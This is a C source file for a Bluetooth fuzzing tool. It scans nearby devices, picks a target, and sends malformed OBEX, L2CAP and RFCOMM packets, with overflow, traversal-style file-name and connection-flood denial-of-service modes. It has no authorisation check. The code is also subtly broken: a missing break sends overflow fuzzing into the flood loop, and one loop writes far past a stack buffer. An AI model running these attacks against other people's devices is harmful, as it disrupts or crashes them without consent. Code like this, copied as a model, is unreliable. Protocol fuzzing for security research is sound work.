/*
 ____  __    _  _  ____  ____  ____ 
(  __)(  )  / )( \(  __)(  __)(  _ \
) _) / (_/\) \/ ( ) _)  ) _)  ) _ (
(__)  \____/\____/(__)  (__)  (____/
*/
#include <stdio.h>
#include <malloc.h>
#include <string.h>
#include <math.h>

#include <sys/types.h>
#include <sys/stat.h>
#include <unistd.h>
#include <sys/fcntl.h>

#include <bluetooth/bluetooth.h>
#include <bluetooth/hci.h>
#include <bluetooth/hci_lib.h>
#include <bluetooth/l2cap.h>
#include <bluetooth/rfcomm.h>
#include <bluetooth/sdp.h>
#include <bluetooth/sdp_lib.h>
#include <stdlib.h>

#include "obex.h"
#include "gen_fuz.h"
#include "l2capfuzz.h"
#include "rfcfuzz.h"

#define ADDR_MAX_LEN 19
#define NAME_MAX_LEN 255
#define PATH_MAX_LEN 1024
#define GRID_MAX_LEN 255

char title[]=" ____  __    _  _  ____  ____  ____ \n(  __)(  )  / )( \\(  __)(  __)(  _ \\\n) _) / (_/\\) \\/ ( ) _)  ) _)  ) _ (\n(__)  \\____/\\____/(__)  (__)  (____/\n";

unsigned int getUint32FromChar(unsigned char c3,unsigned char c2,unsigned char c1,unsigned char c0)
{
    unsigned int x=0;
    x=x|(c3<<24);
    x=x|(c2<<16);
    x=x|(c1<<8);
    x=x|(c0<<0);
    return x;
}

int scanNearDevices(char devAddr[][ADDR_MAX_LEN],char devName[][NAME_MAX_LEN],int maxLen)
{
    int devId=hci_get_route(NULL);
    int devSocket=hci_open_dev(devId);
    if(devId<0||devSocket<0)
    {
        perror("socket:");
        return -1;
    }
    inquiry_info*ii;
    ii=(inquiry_info*)malloc(maxLen*sizeof(inquiry_info));
    int len=8;
    maxLen=hci_inquiry(devId,len,maxLen,NULL,&ii,IREQ_CACHE_FLUSH);
    for(int i=0;i<maxLen;i++)
    {
        memset(devAddr[i],0,ADDR_MAX_LEN);
        ba2str(&((ii+i)->bdaddr),devAddr[i]);
        memset(devName[i],0,NAME_MAX_LEN);
        if(hci_read_remote_name(devSocket,&((ii+i)->bdaddr),NAME_MAX_LEN,devName[i],0)<0)
        {
            strcpy(devName[i],"[UNKNOWN]");
        }
        printf("[+] %d %s:%s\n",i,devName[i],devAddr[i]);
    }
    free(ii);
    hci_close_dev(devSocket);
    return maxLen;
}

int scanTargetService(int tarId,char devAddr[][ADDR_MAX_LEN],char serviceName[][NAME_MAX_LEN],int servicechannel[],int maxLen)
{
    //取得本地蓝牙设备信息
    struct hci_dev_info localDev;
    if(hci_devinfo(0,&localDev)<0)
    {
        perror("get local device info:");
        return -1;
    }
    bdaddr_t tarAddr;
    str2ba(devAddr[tarId],&tarAddr);

    //连接到远程蓝牙设备sdp服务
    sdp_session_t *pss=sdp_connect(&(localDev.bdaddr),&tarAddr,SDP_RETRY_IF_BUSY);
    if(!pss)
    {
        perror("connect to remote sdp service:");
        return -1;
    }

    //设置查询条件
    uuid_t tarUuid;
    sdp_uuid16_create(&tarUuid,PUBLIC_BROWSE_GROUP);
    uint32_t range=0x0000ffff;
    sdp_list_t *attrid,*search,*req;
    attrid=sdp_list_append(0,&range);
    search=sdp_list_append(0,&tarUuid);
    if(sdp_service_search_attr_req(pss,search,SDP_ATTR_REQ_RANGE,attrid,&req)<0)
    {
        perror("sdp service search:");
        sdp_close(pss);
        return -1;
    }
    sdp_list_free(attrid,0);
    sdp_list_free(search,0);

    //遍历查询结果
    int len=0;
    for(;req&&(len<maxLen);req=req->next)
    {
        sdp_record_t*rec=(sdp_record_t*)(req->data);
        //sdp_record_print(rec);

        //取得服务名
        memset(serviceName[len],0,NAME_MAX_LEN);
        if(sdp_get_service_name(rec,serviceName[len],NAME_MAX_LEN)<0)
        {
            strcpy(serviceName[len],"[UNKNOWN]");
        }

        //获取可用的协议列表
        sdp_list_t *protos;
        sdp_get_access_protos(rec, &protos);
        if(protos)
        {
            //取得RFCOMM协议channel
            int channel=sdp_get_proto_port(protos,RFCOMM_UUID);
            servicechannel[len]=channel;

            printf("%d %s:%d\n",len,serviceName[len],servicechannel[len]);

            len++;
        }
        
    }
    sdp_close(pss);
    return len;
}

int doOBEX(char tarAddr[ADDR_MAX_LEN],int channel)
{
    printHeader();
    printf("[-] connecting.....\n");
    int s=socket(PF_BLUETOOTH,SOCK_STREAM,BTPROTO_RFCOMM);
    if(s<0)
    {
        perror("socket:");
        return -1;
    }
    struct sockaddr_rc addr;
    addr.rc_family=AF_BLUETOOTH;
    addr.rc_channel=channel;
    str2ba(tarAddr,&(addr.rc_bdaddr));
    if(0!=connect(s,(const struct sockaddr*)(&addr),sizeof(addr)))
    {
        perror("connect:");
        return -1;
    }

    unsigned xx=pow(2,15)+1;
    //初始化发送缓冲区
    char sendBuf[xx];
    char recvBuf[OBEX_PACKET_MAX_LEN];
    unsigned int realLen;

#pragma region 
    //发送连接请求
    memset(sendBuf,0,xx);
    realLen=0;

    ObexSetRowPacket(sendBuf,OBEX_PACKET_MAX_LEN,&realLen,OBEX_OP_CONNECT);

    ObexSetCountHeader(sendBuf+realLen,1,&realLen);

    ObexSetRowPacketLen(sendBuf,realLen);

    send(s,sendBuf,realLen,0);


    struct timeval timeout = {2,0}; //set timeout 3s
    setsockopt(s,SOL_SOCKET,SO_RCVTIMEO,(char *)&timeout,sizeof(struct timeval));

    //接收数据,判断是否连接成功
    memset(recvBuf,0,OBEX_PACKET_MAX_LEN);
    recv(s,recvBuf,OBEX_PACKET_MAX_LEN,0);
    ObexSuccessPacket*successPacket=(ObexSuccessPacket*)recvBuf;
    if(OBEX_OP_SUCCESS==successPacket->op||OBEX_OP_SUCCESS2==successPacket->op)
    {
        printf("[+] obex connection succeed, channel:%d\n",channel);
    }
    else
    {
        printf("[!] obex connection failed\n");
        return -1;
    }
    //取得连接id
    ObexConnectionIdHeader*connectionIdHeader=(ObexConnectionIdHeader*)(recvBuf+OBEX_ROWPACKET_SIZE);
    int connectionId=getUint32FromChar(connectionIdHeader->c3,connectionIdHeader->c2,connectionIdHeader->c1,connectionIdHeader->c0);
    printHeader();
    printf("Refer:\n");
    printf("OBEX_OP_CONNECT (0x80)\tOBEX_OP_DISCONNECT (0x81)\tOBEX_OP_PUT (0x02)\nOBEX_OP_PUT2 (0x82)\tOBEX_OP_SETPATH (0x85)\tOBEX_OP_GET (0x03)\n");
    printf("[+] choose one option to start:\n");
    printf("[+] 1.load dir fuzz (input:op_num,op_code)\n");
    printf("[+] 2.length_fuzz (input:op_num,op_code)\n");
    printf("[+] 3.overflow_fuzz (input:op_num,op_code)\n");
    printf("[+] 4.DOS_fuzz (input:op_num,-1)\n");
    printf("[+] 5.hyper long file name test  (input:op_num,-1)\n");
    printf("[+] 0.exit (input:op_num,-1)\n");
    printf("input:");
    int chos=-1;
    int opcode=OBEX_OP_PUT;
    while(chos<0|chos>5){
        scanf("%d,%d",&chos,&opcode);
        if(chos<0|chos>5)
            printf("Illegal input! Again:");
    }

    switch(chos)
    {
    case 1:
        //1.load dir.txt test
        load_obex_namebuf(s,connectionId,opcode);
        break;
    case 2:
        length_fuzz(s,connectionId,opcode);
        break;
    case 3:
        overflow_fuzz(s,connectionId,opcode,300);
    case 4:
    //DOS
        realLen=0;
        ObexSetRowPacket(sendBuf,OBEX_PACKET_MAX_LEN,&realLen,OBEX_OP_CONNECT);
        ObexSetCountHeader(sendBuf+realLen,1,&realLen);
        ObexSetRowPacketLen(sendBuf,realLen);
        int times=1024*1024;
        while(times--)
        {
            send(s,sendBuf,realLen,0);
            recv(s,recvBuf,OBEX_PACKET_MAX_LEN,0);
        }
        break;
    case 5:
        #pragma endregion
        //2.构造obex超长put漏洞-------------------------------
        #pragma region 
        char nameBuf[]=".....................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................";
        //char nameBuf[]="../";
        //char nameBuf[]="aa.txt";
        char bodyBuf[]="1234567890";
        memset(sendBuf,0,xx);
        realLen=0;

        ObexSetRequestPacket(sendBuf,&realLen,OBEX_OP_PUT);
        ObexSetConnectionIdHeader(sendBuf+realLen,connectionId,&realLen);
        ObexSetNameHeader(sendBuf+realLen,nameBuf,strlen(nameBuf),&realLen);
        ObexSetlLengthHeader(sendBuf+realLen,strlen(bodyBuf)-3,&realLen);
        ObexSetBodyHeader(sendBuf+realLen,bodyBuf,strlen(bodyBuf),&realLen);
        ObexSetRequestPacketLen(sendBuf,realLen);
        if(send(s,sendBuf,realLen,0)<0)
            perror("connection:");
    #pragma endregion
        //-------------------------------------------------------------
        //3.构造超长文件名----------------------------------------
        #pragma region 
        int nameLen=(xx-1)/4;
        for(int i=0;i<nameLen;i++)
        {
            nameBuf[i]='A';
        }
        nameBuf[nameLen-4]='.';
        nameBuf[nameLen-3]='t';
        nameBuf[nameLen-2]='x';
        nameBuf[nameLen-1]='t';

        memset(sendBuf,0,nameLen);
        realLen=0;

        ObexSetRequestPacket(sendBuf,&realLen,OBEX_OP_PUT);
        ObexSetConnectionIdHeader(sendBuf+realLen,connectionId,&realLen);
        ObexSetNameHeader(sendBuf+realLen,nameBuf,nameLen,&realLen);
        ObexSetlLengthHeader(sendBuf+realLen,10,&realLen);
        ObexSetBodyHeader(sendBuf+realLen,"aa",2,&realLen);
        ObexSetRequestPacketLen(sendBuf,realLen);
        send(s,sendBuf,realLen,0);
        #pragma endregion
        //-------------------------------------------------------------
        break;
    case 0:
        return 3;
        break;
    default:
        return 3;
        break;
    }
    return 3;
}

int doL2CAP(char tarAddr[ADDR_MAX_LEN]){

    printHeader();
    printf("[-] connecting.....\n");
    int l2_sck = 0;
    int iRel  = 0;
    struct sockaddr_l2 local_l2_addr;
    struct sockaddr_l2 remote_l2_addr;
    char str[24] ={0};
    int lenth = 0;
    int size = 50;
    int sock,dev_id;
    char* send_buf;
    char* recv_buf;
    int id = 2; //不要为0
    char addr[19] = { 0 };
    char name[248] = { 0 };

    dev_id = hci_get_route(NULL);
    sock = hci_open_dev( dev_id );
    if (dev_id < 0 || sock < 0) {
        perror("opening socket");
        exit(1);
    }

    send_buf = malloc(L2CAP_CMD_HDR_SIZE + size);
    recv_buf = malloc(L2CAP_CMD_HDR_SIZE + size);

     // create l2cap raw socket
    l2_sck = socket(PF_BLUETOOTH, SOCK_RAW, BTPROTO_L2CAP); //创建L2CAP protocol的RAW Packet
    if(l2_sck < 0)
    {
    perror("\nsocket:");
    return -1;
    }
    printf("create l2cap socket successfully\n");

    //bind
    memset(&local_l2_addr, 0, sizeof(struct sockaddr_l2));
    local_l2_addr.l2_family = AF_BLUETOOTH;
    bacpy(&local_l2_addr.l2_bdaddr , BDADDR_ANY);

    iRel = bind(l2_sck, (struct sockaddr*) &local_l2_addr, sizeof(struct sockaddr_l2));
    if(iRel < 0)
    {
    perror("\nbind()");
    exit(0);
    }
    printf("bind successfully\n");
    
    
    //connect
    memset(&remote_l2_addr, 0 , sizeof(struct sockaddr_l2));
    remote_l2_addr.l2_family = AF_BLUETOOTH;
    hci_read_remote_name(sock, tarAddr, sizeof(name), name, 0);
    ba2str(tarAddr,addr);
    printf("Connect to %s : %s\n", name,addr);
    str2ba(addr, &remote_l2_addr.l2_bdaddr);
    
    iRel = connect(l2_sck, (struct sockaddr*)&remote_l2_addr, sizeof(struct sockaddr_l2));
    if(iRel < 0)
    {
    perror("\nconnect()");
    exit(0);
    }

    //get local bdaddr
    lenth = sizeof(struct sockaddr_l2);
    memset(&local_l2_addr, 0, sizeof(struct sockaddr_l2));

    iRel = getsockname(l2_sck, (struct sockaddr*) &local_l2_addr, &lenth);
    if(iRel < 0)
    {
    perror("\ngetsockname()");
    exit(0);
    }
    ba2str(&(local_l2_addr.l2_bdaddr), str);
    printf("\nLocal Socket bdaddr:[%s]\n", str);
    //printf("l2ping: [%s] from [%s](data size %d) ...\n", batostr(&(ii+choose)->bdaddr), str, size);

    for (int i = 0; i < size; i++)
    send_buf[L2CAP_CMD_HDR_SIZE + i] = 0;

    l2cap_cmd_hdr *send_cmd = (l2cap_cmd_hdr *) send_buf;
    l2cap_cmd_hdr *recv_cmd = (l2cap_cmd_hdr *) recv_buf;

   if(recv(l2_sck, recv_buf, size + L2CAP_CMD_HDR_SIZE, 0) <= 0)
   {
    perror("\nrecv()");
    }
    printHeader();
    printf("[+] choose one option to start:\n");
    printf("[+] 1.l2caphdr_fuzz (input:op_num)\n");
    printf("[+] 2.l2caphdr_overflow (input:op_num)\n");
    printf("[+] 3.l2caphdr_dos (input:op_num)\n");
    printf("[+] 0.exit\n");

    int chos=-1;
    while(chos<0|chos>5){
        scanf("%d",&chos);
        if(chos<0|chos>5)
            printf("Illegal input! Again:");
    }

    printHeader();
    switch (chos)
    {
    case 1:
        l2hdr_fuzz(l2_sck,50,0,1000,1500);
        break;
    case 2:
        int get;
    	get=l2hdr_overflow(l2_sck,10);
    	get=l2hdr_overflow(l2_sck,30);
        break;
    case 3:
        l2hdr_fuzz(l2_sck,20,0,5000,1500);
        break;
    case 0:
        return 3;
    default:
        return 3;
        break;
    }
    return 3;
}

int doRFCOMM(char tarAddr[ADDR_MAX_LEN])
{
    printHeader();
    printf("[+] choose one option to start:\n");
    printf("[+] 1.rfc_fuzz (input:op_num)\n");
    printf("[+] 2.rfc_dos (input:op_num)\n");
    printf("[+] 0.exit\n");

    int chos=-1;
    while(chos<0|chos>5){
        scanf("%d",&chos);
        if(chos<0|chos>5)
            printf("Illegal input! Again:");
    }

    switch (chos)
    {
    case 1:
        rfcfuzz(tarAddr, 200, 1);
        break;
    case 2:
        rfcfuzz(tarAddr, 300, 2);
        break;
    case 0:
        return 3;
        break;
    default:
        return 3;
        break;
    }
    return 3;
}

void tryFuzzing(char devAddr[ADDR_MAX_LEN],int tarDId)
{
    printHeader();
    printf("Do you want to scan target service?(Y/n):");
    char c='Y';
    scanf("%c",&c);
    if(c=='Y'|c=='y')
    {
        int maxLen=20;
        char serviceName[maxLen][NAME_MAX_LEN];
        int serviceChannel[maxLen];
        maxLen=scanTargetService(tarDId,devAddr,serviceName,serviceChannel,maxLen);
    }
    printf("\n(press any key to continue)\n");
    getchar();
    getchar();
pos:
    printHeader();
    printf("[-] please choose one target protol(1~3):\n");
    printf("[+] 1.L2CAP\n");
    printf("[+] 2.RFCOMM\n");
    printf("[+] 3.OBEX\n");
    printf("input:");
    int chos=-1;
    while(chos<1|chos>3){
        scanf("%d",&chos);
        if(chos<1|chos>3)
            printf("Illegal input! Again:");
    }
    switch (chos)
    {
    case 1:
        int get;
        get=doL2CAP(devAddr);
        if(get==3)
            goto pos;
        break;
    case 2:
        if(doRFCOMM(devAddr)==3)
            goto pos;
        break;
    case 3:
        int check=-1;
        int id=1;
        while(check<0){
            check=doOBEX(devAddr,id);
            if(check==3)
                goto pos;
            id++;
        }
        break;
    default:
        break;
    }

}

void printHeader()
{
    fflush(stdout);
    printf("\x1b[H\x1b[2J"); 
    printf("-------------------------------------------------\n");
    printf("%s",title);
    printf("version: v0.1                        aunthor:Adu\n");
    printf("-------------------------------------------------\n");
}



int main()
{
    printHeader();
    int maxLen=10;
    char devName[maxLen][NAME_MAX_LEN];
    char devAddr[maxLen][ADDR_MAX_LEN];
    maxLen=scanNearDevices(devAddr,devName,maxLen);
    fflush(stdout);
    if(0==maxLen)
    {
        printf("附近无蓝牙设备\n");
        return 0;
    }

    int tarDId=-1;
    while(tarDId<0||tarDId>=maxLen)
    {
        printf("请输入要fuzz的设备id\n");
        scanf("%d",&tarDId);
    }

    tryFuzzing(devAddr[tarDId],tarDId);

    printf("[-]session exit\n");
    return 0;
}
